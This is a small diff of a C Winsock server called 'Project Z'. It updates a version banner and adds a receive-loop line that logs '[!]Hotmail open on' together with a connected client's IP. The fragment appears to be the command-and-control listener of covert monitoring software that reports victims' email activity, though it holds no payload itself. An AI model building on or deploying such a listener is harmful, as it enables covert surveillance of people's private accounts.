@@ -36,7 +36,7 @@ addr.sin_family = AF_INET;
 iResult = WSAStartup(MAKEWORD(2,2),&wsaData);
 //_______
 
-printf("______________Project Z alpha 0.0.3____________\n");
+printf("______________Project Z alpha 0.1.9____________\n");
 
 
 
@@ -157,9 +157,11 @@ char *ip = inet_ntoa(client_info.sin_addr);
 
 //____________MAIN RECEIVE LOOP
  while(recv(Client,databuffer,200,0) != SOCKET_ERROR){ //While the client is still connected
-    if(*databuffer == '*') printf("Ping from \t ID:%d \t  IP:%s\n" , GetCurrentThreadId(),ip);
+    if(*databuffer == '0') printf("[!]Hotmail open on  \t ID:%d \t  IP:%s\n\n" , GetCurrentThreadId(),ip);
+    if(*databuffer == '*') printf("[i]Ping from \t ID:%d \t  IP:%s\n" , GetCurrentThreadId(),ip); //Ping command * received
+     //
 
-    //Print out whatever our client spits at us , with an ID
+
                                 }
 //____________MAIN RECEIVE LOOP END
 
